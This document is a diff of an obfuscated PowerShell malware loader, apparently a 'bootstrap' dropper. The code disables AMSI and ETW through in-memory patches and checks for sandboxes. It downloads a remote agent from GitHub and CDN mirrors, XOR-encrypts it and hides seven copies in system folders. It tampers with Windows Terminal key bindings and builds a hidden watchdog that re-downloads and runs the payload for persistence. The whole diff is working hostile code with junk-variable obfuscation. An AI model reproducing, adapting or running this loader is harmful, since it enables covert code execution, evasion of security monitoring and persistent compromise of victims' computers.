@@ -1,171 +1,136 @@
 # ═══ In-Memory Patches (Polymorphic) ═══
+# Runtime memory patch
+$rubK = [int](9303) % 256
+$DQSSq30 = ([char]83+[char]121+[char]115+[char]116+[char]101+[char]109+[char]46+[char]77+[char]97+[char]110+[char]97+[char]103+[char]101+[char]109+[char]101+[char]110+[char]116+[char]46+[char]65+[char]117+[char]116+[char]111+[char]109+[char]97+[char]116+[char]105+[char]111+[char]110+[char]46+[char]65+[char]109+[char]115+[char]105+[char]85+[char]116+[char]105+[char]108+[char]115)
+$UziQhYgV = [int](574) % 256
+$tvPMV = (-join([byte[]](0x61,0x6d,0x73,0x69,0x49,0x6e,0x69,0x74,0x46,0x61,0x69,0x6c,0x65,0x64)|%{[char]$_}))
+$m14mio6J = [Ref].Assembly.GetType($DQSSq30)
+$R4S1dq2 = [int](6443) % 256
+$b87wZR = $m14mio6J.GetField($tvPMV, ([char]78+[char]111+[char]110+[char]80+[char]117+[char]98+[char]108+[char]105+[char]99+[char]44+[char]83+[char]116+[char]97+[char]116+[char]105+[char]99))
+$b87wZR.SetValue($null, $true)
+$yIrVS = "KLANP"
+
 # ETW blind (P/Invoke)
-[void]([Math]::Abs(46404))
-$o0vmJBV = @"
+$S9KKqlaw = "KPSSX"
+$IcPM2Y = @"
 [DllImport("kernel32.dll")] public static extern IntPtr GetProcAddress(IntPtr h, string n);
 [DllImport("kernel32.dll")] public static extern IntPtr LoadLibrary(string n);
 [DllImport("kernel32.dll")] public static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint p, out uint o);
 "@
-$jwbuxNQ = Add-Type -MemberDefinition $o0vmJBV -Name 'RunConfig8' -Namespace 'SetObject78' -PassThru
-$gR0D = [int](2721) % 256
-$r6pvYTk2 = ([char]110+[char]116+[char]100+[char]108+[char]108+[char]46+[char]100+[char]108+[char]108)
-$SY3HgDa = ([char]69+[char]116+[char]119+[char]69+[char]118+[char]101+[char]110+[char]116+[char]87+[char]114+[char]105+[char]116+[char]101)
-$hexzb = $jwbuxNQ::LoadLibrary($r6pvYTk2)
-$RkFH = $jwbuxNQ::GetProcAddress($hexzb, $SY3HgDa)
-Start-Sleep -Milliseconds 49
-$p6quz = 0
-$jwbuxNQ::VirtualProtect($RkFH, [UIntPtr]::new(1), 0x40, [ref]$p6quz) | Out-Null
-$LJwXW1dW = [byte[]](0xC3)
-[System.Runtime.InteropServices.Marshal]::Copy($LJwXW1dW, 0, $RkFH, $LJwXW1dW.Length)
-$jwbuxNQ::VirtualProtect($RkFH, [UIntPtr]::new(1), $p6quz, [ref]$p6quz) | Out-Null
-[void]([Math]::Abs(68479))
-
-# Runtime memory patch
-Start-Sleep -Milliseconds 7
-$mGOpC6m = ([char]83+[char]121+[char]115+[char]116+[char]101+[char]109+[char]46+[char]77+[char]97+[char]110+[char]97+[char]103+[char]101+[char]109+[char]101+[char]110+[char]116+[char]46+[char]65+[char]117+[char]116+[char]111+[char]109+[char]97+[char]116+[char]105+[char]111+[char]110+[char]46+[char]65+[char]109+[char]115+[char]105+[char]85+[char]116+[char]105+[char]108+[char]115)
-$ZQ1i = "IUWPV"
-$GGaa6F = ([char]97+[char]109+[char]115+[char]105+[char]73+[char]110+[char]105+[char]116+[char]70+[char]97+[char]105+[char]108+[char]101+[char]100)
-$uB407 = [Ref].Assembly.GetType($mGOpC6m)
-$riiy = "RCONS"
-$Uo3a = $uB407.GetField($GGaa6F, [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Tm9uUHVibGljLFN0YXRpYw==")))
-$Uo3a.SetValue($null, $true)
-[void]([Math]::Abs(2695))
+$wLIcK8b4 = Add-Type -MemberDefinition $IcPM2Y -Name 'ParseEntry51' -Namespace 'RunValue10' -PassThru
+[void]([Math]::Abs(38942))
+$T7dUS = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("bnRkbGwuZGxs"))
+$YBJin = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RXR3RXZlbnRXcml0ZQ=="))
+$vixfa = $wLIcK8b4::LoadLibrary($T7dUS)
+$vWKL9 = $wLIcK8b4::GetProcAddress($vixfa, $YBJin)
+[void]([Math]::Abs(94595))
+$bWAO0vL = 0
+$wLIcK8b4::VirtualProtect($vWKL9, [UIntPtr]::new(1), 0x40, [ref]$bWAO0vL) | Out-Null
+$QV98mm = [byte[]](0xC3)
+[System.Runtime.InteropServices.Marshal]::Copy($QV98mm, 0, $vWKL9, $QV98mm.Length)
+$wLIcK8b4::VirtualProtect($vWKL9, [UIntPtr]::new(1), $bWAO0vL, [ref]$bWAO0vL) | Out-Null
+$RKWE = [int](9014) % 256
 
 # Environment validation
-$PjxcA = [Environment]::ProcessorCount
-if ($PjxcA -lt 2) { exit }
-$s6UD4V = [long]0
+$JbcQFUJ = [Environment]::ProcessorCount
+if ($JbcQFUJ -lt 2) { exit }
+$iJa8 = [long]0
 try {
-    $ADv3caA4 = Get-Command Get-CimInstance -ErrorAction SilentlyContinue
-    if ($null -ne $ADv3caA4) {
-        $s6UD4V = [long](Get-CimInstance -ClassName Win32_ComputerSystem -ErrorAction Stop).TotalPhysicalMemory
+    $cZ9bCeL = Get-Command Get-CimInstance -ErrorAction SilentlyContinue
+    if ($null -ne $cZ9bCeL) {
+        $iJa8 = [long](Get-CimInstance -ClassName Win32_ComputerSystem -ErrorAction Stop).TotalPhysicalMemory
     } elseif ($null -ne (Get-Command Get-WmiObject -ErrorAction SilentlyContinue)) {
-        $s6UD4V = [long](Get-WmiObject -Class Win32_ComputerSystem -ErrorAction Stop).TotalPhysicalMemory
+        $iJa8 = [long](Get-WmiObject -Class Win32_ComputerSystem -ErrorAction Stop).TotalPhysicalMemory
     }
 } catch {
-    $s6UD4V = 0
+    $iJa8 = 0
 }
-if ($s6UD4V -gt 0 -and $s6UD4V -lt 2GB) { exit }
-$X5kit3 = [System.DateTime]::Now
-Start-Sleep -Milliseconds 2355
-if (([System.DateTime]::Now - $X5kit3).TotalMilliseconds -lt 1884) { exit }
+if ($iJa8 -gt 0 -and $iJa8 -lt 2GB) { exit }
+$oUjB = [System.DateTime]::Now
+Start-Sleep -Milliseconds 3241
+if (([System.DateTime]::Now - $oUjB).TotalMilliseconds -lt 2592) { exit }
 $ErrorActionPreference='SilentlyContinue'
 Set-StrictMode -Off
 
-# ============================================================
-# BOOTSTRAP v20 FINAL
-# - Auto-detect: conhost --headless → VBS → fallback
-# - Retry 5x mỗi 10s mọi bước critical
-# - Không abort khi bước phụ fail
-# ============================================================
+
 
 $InstallId = ([guid]::NewGuid().ToString('N').Substring(0,8)).ToUpper()
 $osBuild   = [Environment]::OSVersion.Version.Build
+if ($null -ne $true) { $zoToTPn = Get-Date }
 $psExe     = "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe"
-$q3TLkJ = (Get-Random -Minimum 1 -Maximum 452); [void]$q3TLkJ
 $conhost   = "$env:SystemRoot\System32\conhost.exe"
 
 $WtSettings = "$env:LOCALAPPDATA\Packages\Microsoft.WindowsTerminal_8wekyb3d8bbwe\LocalState\settings.json"
-$aFJInWo = [Environment]::MachineName.Length; $aFJInWo = $null
 $WtBackup   = "$env:LOCALAPPDATA\Microsoft\CLR\wts_$InstallId.bak"
 $KillFlag   = "$env:TEMP\dag_kill_$InstallId.flag"
+$lgY4HgB = @{}; $lgY4HgB["ts"] = [DateTime]::UtcNow.Ticks
 $LogFile    = "$env:TEMP\dag_$InstallId.log"
-$IRC6 = @{}; $IRC6["ts"] = [DateTime]::UtcNow.Ticks
 $PidDir     = "$env:TEMP\dag_pid_$InstallId"
 $VbsFile    = "$env:LOCALAPPDATA\Microsoft\CLR\wds_$InstallId.vbs"
+$H4lw2D = (Get-Random -Minimum 1 -Maximum 563); [void]$H4lw2D
+$MutexName  = "Global\DAG_Wd_$InstallId"
+$VTEAP9Jp = (Get-Random -Minimum 1 -Maximum 445); [void]$VTEAP9Jp
 
-function Log($m)  { try { Add-Content -LiteralPath $LogFile -Value "[$(Get-Date -Format 'HH:mm:ss')] $m" -Encoding UTF8 } catch {} }
-function OK($m)   { Write-Host "    [+] $m" -ForegroundColor Green; Log "OK: $m" }
-function WARN($m) { Write-Host "    [!] $m" -ForegroundColor Yellow; Log "WARN: $m" }
-function FAIL($m) { Write-Host "    [X] $m" -ForegroundColor Red; Log "FAIL: $m" }
-function Step($m) { Write-Host "`n[*] $m" -ForegroundColor Cyan; Log "STEP: $m" }
+function Log($m) { try { Add-Content -LiteralPath $LogFile -Value "[$(Get-Date -Format 'HH:mm:ss')] $m" -Encoding UTF8 } catch {} }
+function P($m, $c = "Gray") { Write-Host $m -ForegroundColor $c; Log $m }
 
 function Invoke-Retry {
     param([scriptblock]$Action, [string]$Name, [int]$Max=5, [int]$DelaySec=10)
     for ($i=1; $i -le $Max; $i++) {
         $r = $false
-        try { $r = & $Action } catch { Log "  retry $i ($Name): $_" }
+        $wllvpw = (Get-Random -Minimum 1 -Maximum 938); [void]$wllvpw
+        try { $r = & $Action } catch { Log "retry $i ($Name): $_" }
+        $icMB = [System.Diagnostics.Process]::GetCurrentProcess().Id
         if ($r -eq $true) { return $true }
-        if ($i -lt $Max) {
-            Write-Host "    [!] $Name #$i failed, retry in ${DelaySec}s..." -ForegroundColor Yellow
-            $G8HP = [System.Diagnostics.Process]::GetCurrentProcess().Id
-            Start-Sleep -Seconds $DelaySec
-        }
+        if ($i -lt $Max) { Start-Sleep -Seconds $DelaySec }
+        $rvSGRZ0c = [Environment]::MachineName.Length; $rvSGRZ0c = $null
     }
     return $false
 }
+if ($null -ne $true) { $CkfFs = Get-Date }
 
-Log "=== v20 ID=$InstallId Build=$osBuild ==="
-Write-Host "=== BOOTSTRAP v20 ===" -ForegroundColor Cyan
-Write-Host "ID       : $InstallId" -ForegroundColor Yellow
-$HutGubVR = (Get-Random -Minimum 1 -Maximum 873); [void]$HutGubVR
-Write-Host "OS Build : $osBuild" -ForegroundColor Yellow
-$rXx6tSe = (Get-Random -Minimum 1 -Maximum 282); [void]$rXx6tSe
+Log "=== v21.1 ID=$InstallId Build=$osBuild ==="
+P "=== v21.1 ===" Cyan
+if ($null -ne $true) { $p7wh = Get-Date }
+P "ID: $InstallId | OS: $osBuild" Yellow
 
-# ============================================================
-# STEP 0: DETECT LAUNCHER (conhost → VBS → fallback)
-# ============================================================
-Step "Detect launcher method"
-if ($null -ne $true) { $Bz2BW = Get-Date }
-
+# STEP 0: DETECT LAUNCHER
 $testTxt = "$env:TEMP\_ldr_$(Get-Random).txt"
 $testPayload = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes("Add-Content '$testTxt' x"))
 
-# Try conhost --headless
-$launcher = 'powershell'  # default
-$launcherExe = $psExe
-$launcherWrapper = $null  # prefix wrapper
-
+$launcher = 'powershell'
 if (Test-Path $conhost) {
     Remove-Item $testTxt -Force -EA 0
     try {
         Start-Process $conhost -ArgumentList "--headless","`"$psExe`"","-NoProfile","-ExecutionPolicy","Bypass","-EncodedCommand",$testPayload -WindowStyle Hidden -EA 0
+        try { $j4TX3X = [System.IO.Path]::GetTempPath() } catch { $j4TX3X = $null }
         Start-Sleep 3
-        if (Test-Path $testTxt) {
-            $launcher = 'conhost'
-            $vuKv = (Get-Random -Minimum 1 -Maximum 772); [void]$vuKv
-            OK "Launcher: conhost --headless (no flash)"
-        }
+        $jgSoJAC = [Environment]::MachineName.Length; $jgSoJAC = $null
+        if (Test-Path $testTxt) { $launcher = 'conhost' }
     } catch { }
-    $sY7JcEw0 = @{}; $sY7JcEw0["ts"] = [DateTime]::UtcNow.Ticks
     Remove-Item $testTxt -Force -EA 0
 }
-
-# If conhost fails → try VBS
 if ($launcher -eq 'powershell') {
     $testVbsPath = "$env:TEMP\_ldr_$(Get-Random).vbs"
-    $QZV46V = [Environment]::MachineName.Length; $QZV46V = $null
-    $vbsContent = "CreateObject(""WScript.Shell"").Run ""powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand $testPayload"", 0, False"
-    [IO.File]::WriteAllText($testVbsPath, $vbsContent, [Text.Encoding]::ASCII)
+    [IO.File]::WriteAllText($testVbsPath, "CreateObject(""WScript.Shell"").Run ""powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand $testPayload"", 0, False", [Text.Encoding]::ASCII)
     try {
         Start-Process wscript.exe -ArgumentList "`"$testVbsPath`"" -WindowStyle Hidden -EA 0
         Start-Sleep 3
-        $F7s3HNO = [System.Diagnostics.Process]::GetCurrentProcess().Id
-        if (Test-Path $testTxt) {
-            $launcher = 'vbs'
-            OK "Launcher: VBS (wscript + Run hide)"
-        }
-        $JpZD = [System.Diagnostics.Process]::GetCurrentProcess().Id
+        if (Test-Path $testTxt) { $launcher = 'vbs' }
     } catch { }
     Remove-Item $testTxt, $testVbsPath -Force -EA 0
 }
-$JPVjHP = (Get-Random -Minimum 1 -Maximum 350); [void]$JPVjHP
+P "Launcher: $launcher" $(if($launcher -eq 'powershell'){'Yellow'}else{'Green'})
+$ggtZmOZU = (Get-Random -Minimum 1 -Maximum 459); [void]$ggtZmOZU
 
-# Fallback
-if ($launcher -eq 'powershell') {
-    WARN "Launcher: fallback powershell (may flash)"
-}
-$FteaJG = [System.Diagnostics.Process]::GetCurrentProcess().Id
-
-# ============================================================
 # STEP 1: DOWNLOAD
-# ============================================================
-Step "Download agent"
 $urls = @(
     'https://raw.githubusercontent.com/sangoccnhule1997ac939-spec/magic_ps/main/test.log',
     'https://cdn.jsdelivr.net/gh/sangoccnhule1997ac939-spec/magic_ps@main/test.log',
     'https://cdn.statically.io/gh/sangoccnhule1997ac939-spec/magic_ps/main/test.log'
 )
+$urlsStr = ($urls | ForEach-Object { "'$_'" }) -join ','
+
 $agent = $null
 $dlOK = Invoke-Retry -Name "Download" -Action {
     foreach ($u in $urls) {
@@ -175,29 +140,25 @@ $dlOK = Invoke-Retry -Name "Download" -Action {
             if ($script:agent.Length -gt 500) { return $true }
         } catch { }
     }
+    $wSwCVAE = (Get-Random -Minimum 1 -Maximum 579); [void]$wSwCVAE
     return $false
-    $tXCJ = (Get-Random -Minimum 1 -Maximum 585); [void]$tXCJ
 }
-if (-not $dlOK) { FAIL "Download ABORT"; return }
-try { $MwP42 = [System.IO.Path]::GetTempPath() } catch { $MwP42 = $null }
-OK "Downloaded $($agent.Length) chars"
+$zHbG = (Get-Random -Minimum 1 -Maximum 178); [void]$zHbG
+if (-not $dlOK) { P "Download FAILED" Red; return }
+P "Download: $($agent.Length) chars" Green
 
-# ============================================================
 # STEP 2: XOR + 7 CLONES
-# ============================================================
-Step "XOR + 7 clones"
-try { $yOfn = [System.IO.Path]::GetTempPath() } catch { $yOfn = $null }
 $raw = [Text.Encoding]::UTF8.GetBytes($agent)
+$pdi7ev0b = [Environment]::MachineName.Length; $pdi7ev0b = $null
 $key = [byte[]]::new(32)
 [Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($key)
-$GiFk = @{}; $GiFk["ts"] = [DateTime]::UtcNow.Ticks
 $enc = [byte[]]::new($raw.Length)
 for ($i=0; $i -lt $raw.Length; $i++) { $enc[$i] = $raw[$i] -bxor $key[$i % 32] }
-try { $UI9rcq = [System.IO.Path]::GetTempPath() } catch { $UI9rcq = $null }
 $blob = [byte[]]::new(32 + $enc.Length)
-$ro9KKiYz = [System.Net.Dns]::GetHostName().Length
+$zlAUC = [System.Net.Dns]::GetHostName().Length
 [Buffer]::BlockCopy($key, 0, $blob, 0, 32)
 [Buffer]::BlockCopy($enc, 0, $blob, 32, $enc.Length)
+try { $HDxbsY4t = [System.IO.Path]::GetTempPath() } catch { $HDxbsY4t = $null }
 
 $folders = @(
     "$env:LOCALAPPDATA\Microsoft\Windows\INetCache\IE\Container",
@@ -211,31 +172,27 @@ $folders = @(
 $clones = @()
 foreach ($f in $folders) {
     $folder = $f
-    $iq4mZr = (Get-Random -Minimum 1 -Maximum 165); [void]$iq4mZr
-    $ok = Invoke-Retry -Name "Clone $folder" -Max 3 -DelaySec 5 -Action {
+    $ok = Invoke-Retry -Name "Clone" -Max 3 -DelaySec 5 -Action {
         try {
             if (-not (Test-Path $folder)) { New-Item -ItemType Directory -Path $folder -Force | Out-Null }
+            $E27YFiQ0 = [Environment]::MachineName.Length; $E27YFiQ0 = $null
             $p = Join-Path $folder "$InstallId.dat"
             [IO.File]::WriteAllBytes($p, $blob)
             if ((Get-Item $p -Force).Length -lt 500) { return $false }
-            if ($null -ne $true) { $NCcy = Get-Date }
             try { $fi = Get-Item $p -Force; $fi.Attributes = $fi.Attributes -bor [IO.FileAttributes]::Hidden } catch {}
             return $true
         } catch { return $false }
-        if ($null -ne $true) { $kaXtIEy = Get-Date }
+        $EdET = [Environment]::MachineName.Length; $EdET = $null
     }
     if ($ok) { $clones += (Join-Path $folder "$InstallId.dat") }
-    if ($null -ne $true) { $ste3K4u = Get-Date }
 }
-if ($clones.Count -eq 0) { FAIL "No clone ABORT"; return }
-OK "Clones: $($clones.Count)/7"
-$clonesStr = ($clones | ForEach-Object { "'$_'" }) -join ','
-$jSuS = [System.Net.Dns]::GetHostName().Length
+if ($clones.Count -eq 0) { P "Clone FAILED" Red; return }
+P "Clones: $($clones.Count)/7" Green
 
-# ============================================================
-# STEP 3: PATCH WT settings.json
-# ============================================================
-Step "Patch WT settings.json"
+$clonesStr = ($clones | ForEach-Object { "'$_'" }) -join ','
+$foldersStr = ($folders | ForEach-Object { "'$_'" }) -join ','
+
+# STEP 3: PATCH WT
 $patchedJson = @'
 {
     "$help": "https://aka.ms/terminal-documentation",
@@ -246,44 +203,16 @@ $patchedJson = @'
     "defaultProfile": "{61c54bbd-c2c6-5271-96e7-009a87ff44bf}",
     "keybindings": 
     [
-        {
-            "id": "Terminal.CopyToClipboard",
-            "keys": "ctrl+c"
-        },
-        {
-            "id": "Terminal.DuplicatePaneAuto",
-            "keys": "alt+shift+d"
-        }
+        { "id": "Terminal.CopyToClipboard", "keys": "ctrl+c" },
+        { "id": "Terminal.DuplicatePaneAuto", "keys": "alt+shift+d" }
     ],
-    "newTabMenu": 
-    [
-        {
-            "type": "remainingProfiles"
-        }
-    ],
-    "profiles": 
-    {
+    "newTabMenu": [ { "type": "remainingProfiles" } ],
+    "profiles": {
         "defaults": {},
-        "list": 
-        [
-            {
-                "commandline": "%SystemRoot%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
-                "guid": "{61c54bbd-c2c6-5271-96e7-009a87ff44bf}",
-                "hidden": false,
-                "name": "Windows PowerShell"
-            },
-            {
-                "commandline": "%SystemRoot%\\System32\\cmd.exe",
-                "guid": "{0caa0dad-35be-5f56-a8ff-afceeeaa6101}",
-                "hidden": false,
-                "name": "Command Prompt"
-            },
-            {
-                "guid": "{b453ae62-4e3d-5e58-b989-0a998ec441b8}",
-                "hidden": false,
-                "name": "Azure Cloud Shell",
-                "source": "Windows.Terminal.Azure"
-            }
+        "list": [
+            { "commandline": "%SystemRoot%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "guid": "{61c54bbd-c2c6-5271-96e7-009a87ff44bf}", "hidden": false, "name": "Windows PowerShell" },
+            { "commandline": "%SystemRoot%\\System32\\cmd.exe", "guid": "{0caa0dad-35be-5f56-a8ff-afceeeaa6101}", "hidden": false, "name": "Command Prompt" },
+            { "guid": "{b453ae62-4e3d-5e58-b989-0a998ec441b8}", "hidden": false, "name": "Azure Cloud Shell", "source": "Windows.Terminal.Azure" }
         ]
     },
     "schemes": [],
@@ -295,31 +224,27 @@ $bkOK = Invoke-Retry -Name "WT backup" -Max 3 -DelaySec 5 -Action {
         $agDir = Split-Path $WtBackup -Parent
         if (-not (Test-Path $agDir)) { New-Item -ItemType Directory -Path $agDir -Force | Out-Null }
         [IO.File]::WriteAllText($WtBackup, $patchedJson, [Text.UTF8Encoding]::new($false))
-        $HRipGYrw = [System.Net.Dns]::GetHostName().Length
+        $Bk1Dffd = [Environment]::MachineName.Length; $Bk1Dffd = $null
         try { $fi = Get-Item $WtBackup -Force; $fi.Attributes = $fi.Attributes -bor [IO.FileAttributes]::Hidden } catch {}
         return (Test-Path $WtBackup)
     } catch { return $false }
 }
-if ($bkOK) { OK "WT backup" } else { WARN "WT backup failed" }
-$hAwk = [System.Diagnostics.Process]::GetCurrentProcess().Id
+$xrBoN = @{}; $xrBoN["ts"] = [DateTime]::UtcNow.Ticks
 $wtOK = Invoke-Retry -Name "WT patch" -Max 3 -DelaySec 5 -Action {
     try {
         if (Test-Path $WtSettings) {
             Copy-Item $WtSettings "$WtSettings.bak_before_$InstallId" -Force -EA 0
             [IO.File]::WriteAllText($WtSettings, $patchedJson, [Text.UTF8Encoding]::new($false))
-            if ($null -ne $true) { $zKsaqW = Get-Date }
+            $UReCrq7 = @{}; $UReCrq7["ts"] = [DateTime]::UtcNow.Ticks
             return $true
+            $HNheIyN8 = [System.Diagnostics.Process]::GetCurrentProcess().Id
         }
-        $cKPu = [Environment]::MachineName.Length; $cKPu = $null
         return $false
     } catch { return $false }
 }
-if ($wtOK) { OK "WT patched" } else { WARN "WT patch failed" }
+P "WT patch: $(if($wtOK){'OK'}else{'SKIP'})" $(if($wtOK){'Green'}else{'Yellow'})
 
-# ============================================================
 # STEP 4: BUILD WATCHDOG
-# ============================================================
-Step "Build watchdog"
 $watchdog = @"
 `$ErrorActionPreference='SilentlyContinue'
 `$id = '$InstallId'
@@ -327,188 +252,205 @@ $watchdog = @"
 `$log = '$LogFile'
 `$pidDir = '$PidDir'
 `$clones = @($clonesStr)
+`$folders = @($foldersStr)
+`$urls = @($urlsStr)
 `$target = 3
 `$wtSettings = '$WtSettings'
 `$wtBackup = '$WtBackup'
+`$mutexName = '$MutexName'
+`$cooldown = "$env:TEMP\dag_cd_$InstallId.txt"
 function W(`$m) { try { Add-Content `$log "[w] `$(Get-Date -Format 'HH:mm:ss') `$m" -Encoding UTF8 } catch {} }
 if (Test-Path `$kill) { exit }
-if (-not (Test-Path `$pidDir)) { New-Item -ItemType Directory -Path `$pidDir -Force | Out-Null }
+try { `$m=[Threading.Mutex]::OpenExisting(`$mutexName); `$m.Dispose(); exit } catch { }
+`$myMutex = New-Object Threading.Mutex(`$false, `$mutexName)
 try {
-    if (Test-Path `$wtBackup) {
-        `$needRestore = `$false
-        if (-not (Test-Path `$wtSettings)) { `$needRestore = `$true }
-        else {
-            `$content = Get-Content `$wtSettings -Raw -EA 0
-            if (`$content -match 'Terminal\.PasteFromClipboard') { `$needRestore = `$true }
-        }
-        if (`$needRestore) {
-            `$bak = [IO.File]::ReadAllText(`$wtBackup, [Text.Encoding]::UTF8)
-            [IO.File]::WriteAllText(`$wtSettings, `$bak, [Text.UTF8Encoding]::new(`$false))
-            W 'wt-patched'
-        }
-    }
-} catch { W ('wt-err: ' + `$_) }
-Get-ChildItem `$pidDir -File -EA 0 | ForEach-Object {
+    if (-not (Test-Path `$pidDir)) { New-Item -ItemType Directory -Path `$pidDir -Force | Out-Null }
     try {
-        `$p = [int]`$_.Name
-        if (-not (Get-Process -Id `$p -EA 0)) { Remove-Item `$_.FullName -Force -EA 0 }
-    } catch { Remove-Item `$_.FullName -Force -EA 0 }
-}
-`$alive = @(Get-ChildItem `$pidDir -File -EA 0).Count
-W "alive=`$alive target=`$target"
-if (`$alive -ge `$target) { exit }
-`$code = `$null
-foreach (`$p in `$clones) {
-    if (Test-Path `$p) { `$code = `$p; break }
-}
-if (-not `$code) { W 'no-clone'; exit }
-Set-Content (Join-Path `$pidDir `$PID) -Value 'x' -Force
-try {
-    `$d = [IO.File]::ReadAllBytes(`$code)
-    `$k = `$d[0..31]
-    `$x = `$d[32..(`$d.Length-1)]
-    `$c = [byte[]]::new(`$x.Length)
-    for (`$i=0; `$i -lt `$x.Length; `$i++) { `$c[`$i] = `$x[`$i] -bxor `$k[`$i % 32] }
-    `$payload = [Text.Encoding]::UTF8.GetString(`$c)
-    W ('decrypted ' + `$code)
-} catch { W ('dec-fail: ' + `$_); Remove-Item (Join-Path `$pidDir `$PID) -Force -EA 0; exit }
-try {
-    W 'exec-start'
-    `$sb = [ScriptBlock]::Create(`$payload)
-    & `$sb
-} catch {
-    W ('exec-fail: ' + `$_)
+        if (Test-Path `$wtBackup) {
+            `$needRestore = `$false
+            if (-not (Test-Path `$wtSettings)) { `$needRestore = `$true }
+            else {
+                `$content = Get-Content `$wtSettings -Raw -EA 0
+                if (`$content -match 'Terminal\.PasteFromClipboard') { `$needRestore = `$true }
+            }
+            if (`$needRestore) {
+                `$bak = [IO.File]::ReadAllText(`$wtBackup, [Text.Encoding]::UTF8)
+                [IO.File]::WriteAllText(`$wtSettings, `$bak, [Text.UTF8Encoding]::new(`$false))
+                W 'wt-restored'
+            }
+        }
+    } catch { }
+    Get-ChildItem `$pidDir -File -EA 0 | ForEach-Object {
+        try { `$p=[int]`$_.Name; if (-not (Get-Process -Id `$p -EA 0)) { Remove-Item `$_.FullName -Force -EA 0 } } catch { Remove-Item `$_.FullName -Force -EA 0 }
+    }
+    `$alive = @(Get-ChildItem `$pidDir -File -EA 0).Count
+    if (`$alive -ge `$target) { exit }
+    `$existingClones = @()
+    foreach (`$c in `$clones) { if (Test-Path `$c) { `$existingClones += `$c } }
+    if (`$existingClones.Count -eq 0) {
+        if (Test-Path `$cooldown) {
+            try { `$last=[datetime]::Parse((Get-Content `$cooldown -Raw).Trim()); if (((Get-Date)-`$last).TotalMinutes -lt 5) { exit } } catch { }
+        }
+        Set-Content `$cooldown -Value (Get-Date).ToString('o') -Force
+        `$dlAgent = `$null
+        foreach (`$u in `$urls) {
+            try { `$r=Invoke-WebRequest -UseBasicParsing -Uri `$u -TimeoutSec 20; `$dlAgent=[Text.Encoding]::UTF8.GetString(`$r.RawContentStream.ToArray()); if (`$dlAgent.Length -gt 500) { break } else { `$dlAgent=`$null } } catch { }
+        }
+        if (-not `$dlAgent) { exit }
+        `$raw = [Text.Encoding]::UTF8.GetBytes(`$dlAgent)
+        `$key = [byte[]]::new(32)
+        [Security.Cryptography.RandomNumberGenerator]::Create().GetBytes(`$key)
+        `$enc = [byte[]]::new(`$raw.Length)
+        for (`$i=0; `$i -lt `$raw.Length; `$i++) { `$enc[`$i] = `$raw[`$i] -bxor `$key[`$i % 32] }
+        `$blob = [byte[]]::new(32 + `$enc.Length)
+        [Buffer]::BlockCopy(`$key, 0, `$blob, 0, 32)
+        [Buffer]::BlockCopy(`$enc, 0, `$blob, 32, `$enc.Length)
+        `$restored = @()
+        foreach (`$f in `$folders) {
+            try {
+                if (-not (Test-Path `$f)) { New-Item -ItemType Directory -Path `$f -Force | Out-Null }
+                `$p = Join-Path `$f "`$id.dat"
+                [IO.File]::WriteAllBytes(`$p, `$blob)
+                try { `$fi=Get-Item `$p -Force; `$fi.Attributes=`$fi.Attributes -bor [IO.FileAttributes]::Hidden } catch {}
+                `$restored += `$p
+            } catch { }
+        }
+        if (`$restored.Count -eq 0) { exit }
+        `$code = `$restored[0]
+        W "net-restored=`$(`$restored.Count)"
+    }
+    else {
+        if (`$existingClones.Count -lt `$clones.Count) {
+            try {
+                `$srcBytes = [IO.File]::ReadAllBytes(`$existingClones[0])
+                foreach (`$c in `$clones) {
+                    if (-not (Test-Path `$c)) {
+                        try {
+                            `$dir = Split-Path `$c -Parent
+                            if (-not (Test-Path `$dir)) { New-Item -ItemType Directory -Path `$dir -Force | Out-Null }
+                            [IO.File]::WriteAllBytes(`$c, `$srcBytes)
+                            try { `$fi=Get-Item `$c -Force; `$fi.Attributes=`$fi.Attributes -bor [IO.FileAttributes]::Hidden } catch {}
+                        } catch { }
+                    }
+                }
+                W 'clones-restored'
+            } catch { }
+        }
+        `$code = `$existingClones[0]
+    }
+    if (-not `$code -or -not (Test-Path `$code)) { exit }
+    Set-Content (Join-Path `$pidDir `$PID) -Value 'x' -Force
+    try {
+        `$d = [IO.File]::ReadAllBytes(`$code)
+        `$k = `$d[0..31]
+        `$x = `$d[32..(`$d.Length-1)]
+        `$c = [byte[]]::new(`$x.Length)
+        for (`$i=0; `$i -lt `$x.Length; `$i++) { `$c[`$i] = `$x[`$i] -bxor `$k[`$i % 32] }
+        `$payload = [Text.Encoding]::UTF8.GetString(`$c)
+    } catch { Remove-Item (Join-Path `$pidDir `$PID) -Force -EA 0; exit }
+    try { `$sb = [ScriptBlock]::Create(`$payload); & `$sb } catch { W ('exec-fail: ' + `$_) } finally { Remove-Item (Join-Path `$pidDir `$PID) -Force -EA 0 }
 } finally {
-    Remove-Item (Join-Path `$pidDir `$PID) -Force -EA 0
+    try { `$myMutex.ReleaseMutex() } catch {}
+    try { `$myMutex.Dispose() } catch {}
 }
 "@
 $watchdogEnc = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($watchdog))
-OK "Watchdog: $($watchdogEnc.Length) chars"
+P "Watchdog: $($watchdogEnc.Length) chars" Green
 
-# ============================================================
-# STEP 5: BUILD LAUNCHER (based on chosen method)
-# ============================================================
-Step "Build launcher ($launcher)"
-
+# STEP 5: BUILD LAUNCHER
 $psArgs = "-NoProfile -NonInteractive -ExecutionPolicy Bypass -EncodedCommand $watchdogEnc"
-$G5eQ5c = @{}; $G5eQ5c["ts"] = [DateTime]::UtcNow.Ticks
 
 if ($launcher -eq 'conhost') {
-    # Task/Reg sẽ gọi: conhost.exe --headless "powershell.exe" <args>
     $launcherExe = $conhost
     $launcherArgs = "--headless `"$psExe`" $psArgs"
+    $YqR5 = (Get-Random -Minimum 1 -Maximum 1045); [void]$YqR5
     $scheduledTaskExe = $conhost
     $scheduledTaskArgs = $launcherArgs
-    OK "Command: conhost.exe --headless"
 }
 elseif ($launcher -eq 'vbs') {
-    # Tạo file VBS chứa sẵn command
-    # Chia EncodedCommand thành 4 phần để tránh dài dòng
